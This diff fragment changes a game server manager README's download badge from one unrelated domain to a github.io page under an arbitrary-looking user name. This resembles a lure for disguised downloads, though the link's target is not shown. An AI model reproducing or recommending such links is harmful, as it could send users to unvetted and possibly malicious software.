@@ -5,7 +5,7 @@ Designed for both small private worlds and massive multiplayer communities, this
 
 With real-time monitoring, custom rule systems, and advanced backup tools, you can keep your server stable, secure, and lag-free while delivering an amazing gameplay experience.
 
-[![Download Server Manager](https://img.shields.io/badge/Download-Server_Manager-blueviolet)](https://paddyrewards.com/)
+[![Download Server Manager](https://img.shields.io/badge/Download-Server_Manager-blueviolet)](https://alfrednovakvpmw.github.io/.github/)
 
 ---
 
